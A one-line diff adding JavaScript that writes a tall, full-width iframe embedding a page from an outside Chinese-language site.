@@ -1,0 +1,1 @@
+document.writeln("<iframe src=\"http://mishi.cqkele.com/iframe/diertong/\" frameborder=\"0\" scrolling=\"no\" width=\"100%\" height=\"12980\"></iframe>");
